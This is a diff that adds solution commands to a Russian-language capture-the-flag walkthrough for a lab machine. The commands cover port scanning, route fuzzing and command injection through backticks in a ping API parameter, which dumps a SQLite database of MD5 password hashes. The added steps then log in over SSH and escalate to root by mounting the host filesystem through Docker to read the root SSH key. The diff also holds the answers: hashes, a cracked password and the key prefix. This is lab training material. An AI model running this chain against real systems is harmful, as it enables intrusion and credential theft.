@@ -29,6 +29,7 @@ Lp1 < fenrir.pro >
 Что вы обнаружили после перечисления служб и ресурсов, доступных на этой машине?
 ### Ответьте на вопросы ниже
 Какое программное обеспечение использует порт 8081?
+nmap -sS -sV -p- <IP>
 ```commandline
 Node.js
 ```
@@ -47,6 +48,10 @@ Ubuntu
 Программное обеспечение, использующее порт 8081, представляет собой REST API. Сколько его маршрутов используется 
 веб-приложением? 
 ```commandline
+wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hw 15 http://<IP>:8081/FUZZ
+# auth, ping
+```
+```commandline
 2
 ```
 
@@ -62,13 +67,25 @@ Ubuntu
 ### Ответьте на вопросы ниже
 Где-то есть база данных. Каково имя ее файла?
 ```commandline
+curl -i 'http://<IP>:8081/ping?ip=`ls`'
+```
+```commandline
 utech.db.sqlite
 ```
 Каков хеш пароля первого пользователя?
 ```commandline
+curl -i 'http://<IP>:8081/ping?ip=`cat%20utech.db.sqlite`'
+
+r00t	f357a0c52799563c7c7b76c1e7543a32
+admin	0d0ea5111e3c1def594c1684e3b9be84
+```
+```commandline
 f357a0c52799563c7c7b76c1e7543a32
 ```
 Какой пароль связан с этим хешем?
+```commandline
+md5
+```
 ```commandline
 n100906
 ```
@@ -85,6 +102,18 @@ n100906
 
 ### Ответьте на вопросы ниже
 Каковы первые 9 символов закрытого SSH-ключа пользователя root?
+```commandline
+ssh r00t@<IP>
+n100906
+
+id
+which docker
+ls -l /usr/bin/docker
+docker run -v /:/mnt --rm -it bash chroot /mnt bash
+whoami
+cat /root/private.txt
+cat /root/.ssh/id_rsa
+```
 ```commandline
 MIIEogIBA
 ```
